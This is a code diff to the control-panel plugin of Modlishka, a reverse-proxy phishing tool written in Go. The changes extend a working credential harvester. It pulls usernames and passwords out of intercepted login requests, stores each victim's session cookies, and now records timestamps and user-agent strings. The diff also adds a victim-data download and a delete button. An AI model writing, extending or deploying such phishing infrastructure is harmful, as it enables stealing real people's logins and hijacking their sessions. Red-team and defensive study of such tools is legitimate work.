@@ -20,24 +20,26 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
-	"github.com/drk1wi/Modlishka/config"
-	"github.com/drk1wi/Modlishka/runtime"
-	"github.com/drk1wi/Modlishka/log"
-	"github.com/tidwall/buntdb"
 	"html/template"
 	"io"
 	"net/http"
 	"net/url"
 	"os"
 	"regexp"
+	"sort"
 	"strings"
 	"time"
+
+	"github.com/drk1wi/Modlishka/config"
+	"github.com/drk1wi/Modlishka/log"
+	"github.com/drk1wi/Modlishka/runtime"
+	"github.com/tidwall/buntdb"
 )
 
 type ExtendedControlConfiguration struct {
 	*config.Options
-	CredParams *string `json:"credParams"`
-	ControlURL *string `json:"ControlURL"`
+	CredParams   *string `json:"credParams"`
+	ControlURL   *string `json:"ControlURL"`
 	ControlCreds *string `json:"ControlCreds"`
 }
 
@@ -62,6 +64,7 @@ var htmltemplate = `<!DOCTYPE html>
   <title>Modlishka Control Panel v.0.1 (beta)</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="refresh" content="15">
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
@@ -84,24 +87,46 @@ function clearcookies(){
     }
 };
 
+function deleteVictim(uuid){
+	$.ajax({
+		url: '/{{$.URL}}/DeleteVictim?user_id='+uuid,
+		type: 'DELETE',
+		success: function (result) {
+			document.location.reload()
+		}
+	});
+}
+
+function downloadData() {
+	const link = document.createElement("a");
+	link.href = "/{{$.URL}}/DownloadData";
+	link.download = "data.txt";
+	document.body.appendChild(link);
+	link.click();
+	document.body.removeChild(link);
+}
+
   </script>
 </head>
 <body>
 
 <div class="container">
   <div class="row">
-  	<div class="col-md-4 text-center">
-  		<h4>Clicks</h4>
-  		<p style="font-weight:bold;font-size: 1em;">{{len .Victims}}</p>
-  	</div>
-  	<div class="col-md-4 text-center">
-  		<h4>Logins</h4>
-  		<p style="font-weight:bold;font-size: 1em;">{{.CredsCount}} ({{printf "%.1f" .CredsPercent}}%)</p>
-  	</div>
-  	<div class="col-md-4 text-center">
-  		<h4>Terminations</h4>
-  		<p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
-  	</div>
+      <div class="col-md-4 text-center">
+          <h4>Clicks</h4>
+          <p style="font-weight:bold;font-size: 1em;">{{len .Victims}}</p>
+      </div>
+      <div class="col-md-4 text-center">
+          <h4>Logins</h4>
+          <p style="font-weight:bold;font-size: 1em;">{{.CredsCount}} ({{printf "%.1f" .CredsPercent}}%)</p>
+      </div>
+      <div class="col-md-4 text-center">
+          <h4>Terminations</h4>
+          <p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
+      </div>
+	<div class="col-md-4 text-center">
+		<button onclick="downloadData()" class="btn btn-success">Download Data</button>
+	  </div>
   </div>
   
   <hr>
@@ -111,17 +136,23 @@ function clearcookies(){
   <table class="table table-dark">
     <thead class="thead-dark">
       <tr>
+        <th class="text-center">Timestamp</th>
         <th class="text-center">UUID</th>
         <th class="text-center">Username</th>
         <th class="text-center">Password</th>
         <th class="text-center">Terminated</th>
-        <th class="text-center">Cookies</th>
+        <th class="text-center"></th>
 
       </tr>
     </thead>
     <tbody>
     {{range .Victims}}
       <tr>
+        {{if .Timestamp}}
+        <td class="text-center">{{.Timestamp.Format "1/2/06 15:04:05"}}</td>
+        {{else}}
+        <td class="text-center"></td>
+        {{end}}
         <td class="text-center">{{.UUID}}</td>
         <td class="text-center">{{.Username}}</td>
         <td class="text-center">{{.Password}}</td>
@@ -133,8 +164,12 @@ function clearcookies(){
         {{end}}
         </td>
         {{/* This requires additional coding ... <td><a onclick="clearcookies();" href="/{{$.URL}}/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a> */}}
-        <td class="text-center"><a  href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
-		</td>
+        <td class="text-center">
+			<div class="btn-group" role="group">
+				<a href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
+				<button onclick="deleteVictim('{{.UUID}}')" class="btn btn-danger">Delete</button>
+			</div>
+        </td>
 
       </tr>
     {{end}}
@@ -160,7 +195,7 @@ var iframetemplate = `<!DOCTYPE html>
 
 html,body{
        width: 100%;
-	   height: 100%;
+       height: 100%;
 }
 
  body {
@@ -172,17 +207,17 @@ html,body{
     top: 50%;
     left: 50%;
     transform: translate(-50%,-50%);
-	width: 150px;
+    width: 150px;
     height: 150px;	
 }
 
 .loader {
     width: calc(100% - 0px);
-	height: calc(100% - 0px);
-	border: 8px solid #162534;
-	border-top: 8px solid #09f;
-	border-radius: 50%;
-	animation: rotate 5s linear infinite;
+    height: calc(100% - 0px);
+    border: 8px solid #162534;
+    border-top: 8px solid #09f;
+    border-radius: 50%;
+    animation: rotate 5s linear infinite;
 }
 
 @keyframes rotate {
@@ -215,6 +250,11 @@ setTimeout(function() {document.location='/'; }, 5000);
 </html>
 `
 
+type TemplateOutput struct {
+	Cookies   string
+	UserAgent string
+}
+
 var cookietemplate = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -228,8 +268,10 @@ var cookietemplate = `<!DOCTYPE html>
 <body>
 
 <div class="container">
+  <h2>User Agent</h2>
+  <pre>{{ .UserAgent }}</pre>
   <h2>Cookies</h2>
-  {{ . }}
+  <pre>{{ .Cookies }}</pre>
 </div>
 
 </body>
@@ -237,10 +279,12 @@ var cookietemplate = `<!DOCTYPE html>
 `
 
 type Victim struct {
-	UUID     string
-	Username string
-	Password string
-	Session  string
+	Timestamp  *time.Time
+	UUID       string
+	Username   string
+	Password   string
+	Session    string
+	UserAgent  string
 	Terminated bool
 }
 
@@ -248,15 +292,15 @@ type Cookie struct {
 	Name  string `json:"name"`
 	Value string `json:"value"`
 
-	Path       string `json:"path"`
-	Domain     string `json:"domain"`
+	Path       string    `json:"path"`
+	Domain     string    `json:"domain"`
 	Expires    time.Time `json:"expire"`
-	RawExpires string 
+	RawExpires string
 
 	// MaxAge=0 means no 'Max-Age' attribute specified.
 	// MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
 	// MaxAge>0 means Max-Age attribute present and given in seconds
-	MaxAge   int 
+	MaxAge   int
 	Secure   bool `json:"secure"`
 	HttpOnly bool `json:"httpOnly"`
 	SameSite http.SameSite
@@ -354,15 +398,15 @@ func (victim *Victim) setCookies(cookies []*http.Cookie, url *url.URL) error {
 
 	for _, v := range cookies {
 		c := Cookie{
-			Name:     v.Name,
-			Value:    v.Value,
-			Path:   v.Path,
-			Domain:   v.Domain,
-			Expires:  v.Expires,
-			RawExpires:  v.RawExpires,
-			MaxAge:  v.MaxAge,
-			HttpOnly: v.HttpOnly,
-			Secure:   v.Secure,
+			Name:       v.Name,
+			Value:      v.Value,
+			Path:       v.Path,
+			Domain:     v.Domain,
+			Expires:    v.Expires,
+			RawExpires: v.RawExpires,
+			MaxAge:     v.MaxAge,
+			HttpOnly:   v.HttpOnly,
+			Secure:     v.Secure,
 			SameSite:   v.SameSite,
 		}
 
@@ -482,6 +526,10 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 		return err
 	}
 
+	if victim.Timestamp != nil {
+		entry.Timestamp = victim.Timestamp
+	}
+
 	if victim.Password != "" {
 		entry.Password = victim.Password
 	}
@@ -497,12 +545,30 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 		entry.Terminated = true
 	}
 
+	if victim.UserAgent != "" {
+		entry.UserAgent = victim.UserAgent
+	}
+
 	err = config.addEntry(entry)
 	if err != nil {
 		return err
 	}
 
 	return nil
+}
+
+func (config *ControlConfig) deleteEntry(victim *Victim) error {
+	entry, err := config.getEntry(victim)
+	if err == buntdb.ErrNotFound {
+		return nil
+	}
+
+	err = config.db.Update(func(tx *buntdb.Tx) error {
+		_, err := tx.Delete(entry.UUID)
+		return err
+	})
+
+	return err
 }
 
 func notifyCollection(victim *Victim) {
@@ -553,7 +619,8 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 			log.Debugf("Error reading body: %v", err)
 		}
 
-		decodedbody, err := url.QueryUnescape(string(body))
+		rawBody := string(body)
+		decodedbody, err := url.QueryUnescape(rawBody)
 		if err != nil {
 			log.Debugf("Error decoding body: %v", err)
 		}
@@ -567,6 +634,10 @@ func (config *ControlConfig) checkRequestCredentials(req *http.Request) (*Requet
 
 		passwords := config.passwordRegexp.FindStringSubmatch(decodedbody)
 		if len(passwords) > 0 {
+			//decodedPasswd, err := url.QueryUnescape(passwords[1])
+			//if err != nil {
+			//	log.Debugf("Error decoding passwd: %v", err)
+			//}
 			creds.passwordFieldValue = passwords[1]
 		}
 
@@ -592,7 +663,31 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 
 	w.WriteHeader(http.StatusOK)
 	w.Header().Set("Content-Type", "application/json")
+
 	victims, _ := CConfig.listEntries()
+	sort.SliceStable(victims, func(i, j int) bool {
+		ti := victims[i].Timestamp
+		tj := victims[j].Timestamp
+
+		if ti == nil && tj == nil {
+			return true
+		}
+
+		if tj == nil {
+			return true
+		}
+
+		if ti == nil {
+			return false
+		}
+
+		if ti.Equal(*tj) {
+			return true
+		}
+
+		return ti.Before(*tj)
+	})
+
 	credsCount := 0
 	for _, v := range victims {
 		if v.Password != "" {
@@ -606,20 +701,20 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 	data := struct {
-        Victims   []Victim
-        CredsCount int
-        TermCount int
-        CredsPercent float64
-        TermPercent float64
-        URL string
-    }{
-        victims,
-        credsCount,
-        termCount,
-        float64(credsCount) / float64(len(victims)) * 100,
-        float64(termCount) / float64(len(victims)) * 100,
-        CConfig.url,
-    }
+		Victims      []Victim
+		CredsCount   int
+		TermCount    int
+		CredsPercent float64
+		TermPercent  float64
+		URL          string
+	}{
+		victims,
+		credsCount,
+		termCount,
+		float64(credsCount) / float64(len(victims)) * 100,
+		float64(termCount) / float64(len(victims)) * 100,
+		CConfig.url,
+	}
 	t := template.New("modlishka")
 	t, _ = t.Parse(htmltemplate)
 	err := t.Execute(w, data)
@@ -629,6 +724,55 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 
 	//v,_ :=json.Marshal(&victims)
 	//io.WriteString(w,string(v))
+}
+
+func HelloHandlerDeleteVictim(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodDelete {
+		w.WriteHeader(http.StatusMethodNotAllowed)
+		return
+	}
+
+	users, ok := r.URL.Query()["user_id"]
+
+	if !ok {
+		log.Infof("Url Param 'users_id' is missing")
+		return
+	}
+
+	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	err := CConfig.deleteEntry(&victim)
+	if err != nil {
+		log.Infof("Error %s", err.Error())
+	}
+}
+
+func HelloHandlerDownloadData(w http.ResponseWriter, r *http.Request) {
+
+	//Grabbing Entries
+	victims, _ := CConfig.listEntries()
+
+	var recordString strings.Builder
+	var terminateString string
+
+	for _, victim := range victims {
+
+		if victim.Username != "" || victim.Password != "" {
+
+			if victim.Terminated == true {
+				terminateString = "Y"
+			} else {
+				terminateString = "N"
+			}
+
+			recordString.WriteString(fmt.Sprintf("UUID: %s\nUsername: %s\nTerminated: %s\n\n",
+				victim.UUID, victim.Username, terminateString))
+		}
+	}
+
+	w.Header().Set("Content-Type", "text/plain")
+	w.Header().Set("Content-Disposition", "attachment; filename=\"data.txt\"")
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte(recordString.String()))
 }
 
 func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {
@@ -742,7 +886,7 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	victim := Victim{UUID: users[0], Username: "", Password: "", Session: "", UserAgent: ""}
 	entry, err := CConfig.getEntry(&victim)
 	if err != nil {
 		log.Infof("Error %s", err.Error())
@@ -762,8 +906,12 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 		cookies = append(cookies, *v)
 	}
 
-	cookiesByte, err := json.Marshal(cookies)
+	cookiesByte, _ := json.MarshalIndent(cookies, "", "  ")
 	cookiesOut := string(cookiesByte)
+
+	userAgentOut := entry.UserAgent
+
+	templateData := TemplateOutput{Cookies: cookiesOut, UserAgent: userAgentOut}
 
 	w.WriteHeader(http.StatusOK)
 
@@ -771,7 +919,7 @@ func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
 
 	t := template.New("modlishkacookiejson")
 	t, _ = t.Parse(cookietemplate)
-	_ = t.Execute(w, cookiesOut)
+	_ = t.Execute(w, templateData)
 
 }
 
@@ -912,12 +1060,12 @@ func init() {
 
 			decodedusername, err := base64.StdEncoding.DecodeString(creds[0])
 			if err != nil {
-				log.Fatalf("decode error:", err)
+				log.Fatalf("decode error: %s\n", err)
 				return
 			}
 			decodedpaswrd, err := base64.StdEncoding.DecodeString(creds[1])
 			if err != nil {
-				log.Fatalf("decode error:", err)
+				log.Fatalf("decode error: %s\n", err)
 				return
 			}
 
@@ -938,6 +1086,8 @@ func init() {
 		handler.HandleFunc("/"+CConfig.url+"/ImpersonateFrames", use(HelloHandlerImpersonateFrames, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/Impersonate", use(HelloHandlerImpersonate, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/Cookies", use(HelloHandlerCookieDisplay, basicAuth))
+		handler.HandleFunc("/"+CConfig.url+"/DeleteVictim", use(HelloHandlerDeleteVictim, basicAuth))
+		handler.HandleFunc("/"+CConfig.url+"/DownloadData", use(HelloHandlerDownloadData, basicAuth))
 
 		log.Infof("Control Panel: " + CConfig.url + " handler registered	")
 		log.Infof("Control Panel URL: " + *config.C.ProxyDomain + "/" + CConfig.url)
@@ -948,10 +1098,11 @@ func init() {
 	s.HTTPRequest = func(req *http.Request, context *HTTPContext) {
 
 		if CConfig.active {
+			now := time.Now()
 
 			if context.UserID != "" {
 				// Save every new ID that comes to the site
-				victim := Victim{UUID: context.UserID}
+				victim := Victim{UUID: context.UserID, Timestamp: &now}
 				_, err := CConfig.getEntry(&victim)
 				// Entry doesn't exist yet
 				if err != nil {
@@ -964,7 +1115,13 @@ func init() {
 
 			if creds, found := CConfig.checkRequestCredentials(req); found {
 
-				victim := Victim{UUID: context.UserID, Username: creds.usernameFieldValue, Password: creds.passwordFieldValue}
+				victim := Victim{
+					UUID:      context.UserID,
+					Username:  creds.usernameFieldValue,
+					Password:  creds.passwordFieldValue,
+					Timestamp: &now,
+				}
+
 				if err := CConfig.updateEntry(&victim); err != nil {
 					log.Infof("Error %s", err.Error())
 					return
@@ -972,6 +1129,14 @@ func init() {
 				notifyCollection(&victim)
 				//_=CConfig.printEntries()
 
+			}
+
+			// update user agent string
+			victim := Victim{UUID: context.UserID}
+			entry, err := CConfig.getEntry(&victim)
+			if err == nil {
+				entry.UserAgent = req.Header.Get("User-Agent")
+				_ = CConfig.updateEntry(entry)
 			}
 
 			cookies := req.Cookies()
@@ -983,7 +1148,7 @@ func init() {
 					return
 				}
 
-				for i, _ := range cookies {
+				for i := range cookies {
 					cookies[i].Domain = context.OriginalTarget
 				}
 
@@ -1004,7 +1169,7 @@ func init() {
 	}
 
 	//process HTTP response (responses can arrive in random order)
-	s.HTTPResponse = func(resp *http.Response, context *HTTPContext,buffer *[]byte) {
+	s.HTTPResponse = func(resp *http.Response, context *HTTPContext, buffer *[]byte) {
 
 		cookies := resp.Cookies()
 		// there are new set-cookies
@@ -1042,9 +1207,16 @@ func init() {
 
 	}
 
-	s.TerminateUser = func(userID string){
+	s.TerminateUser = func(userID string) {
 		log.Infof("Invoking control terminate")
-		victim := Victim{UUID: userID, Terminated: true}
+		// time.Now().Format("1/2/06 15:04:05")
+
+		now := time.Now()
+		victim := Victim{
+			UUID:       userID,
+			Terminated: true,
+			Timestamp:  &now,
+		}
 		err := CConfig.updateEntry(&victim)
 		if err != nil {
 			log.Errorf("Error %s", err)
